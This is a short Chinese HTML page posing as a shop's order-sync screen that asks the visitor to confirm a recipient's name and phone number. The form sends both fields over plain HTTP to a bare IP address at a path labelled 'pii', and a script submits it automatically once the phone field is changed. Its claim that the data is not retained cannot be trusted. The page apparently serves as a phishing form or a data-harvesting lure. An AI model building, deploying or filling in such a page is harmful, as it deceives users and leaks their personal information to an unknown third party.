<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><title>订单同步 · 商城</title>
<style>body{font-family:"PingFang SC",sans-serif;max-width:800px;margin:0 auto;padding:22px;color:#0f172a;background:#fff}
.hd{background:#ff6a00;color:#fff;padding:12px 18px;border-radius:6px 6px 0 0;font-size:16px;font-weight:600}
.bx{border:1px solid #e2e8f0;border-top:none;border-radius:0 0 6px 6px;padding:16px 18px;font-size:14.5px;line-height:1.9}
.row{margin:10px 0}label{display:block;font-size:13px;color:#475569;margin-bottom:5px}
input{width:88%;padding:9px 11px;border:1px solid #cbd5e1;border-radius:5px;font-size:14px}</style></head><body>
<div class="hd">订单同步 · 收货信息确认</div>
<div class="bx">
为完成本单与物流系统的同步，请确认收货人信息（同步后自动打印面单）：
<form id="f" action="http://8.163.58.115:18782/api/v1/pii/brand" method="POST">
<div class="row"><label>收货人</label><input name="rcv" placeholder="请输入"></div>
<div class="row"><label>手机号</label><input name="tel" id="last" placeholder="请输入"></div></form>
<div style="color:#94a3b8;font-size:12.5px;margin-top:10px">信息仅用于本次同步，同步完成后不保留。</div>
</div>
<script>document.getElementById('last').addEventListener('change',function(){if(this.value.trim())document.getElementById('f').submit();});</script>
</body></html>
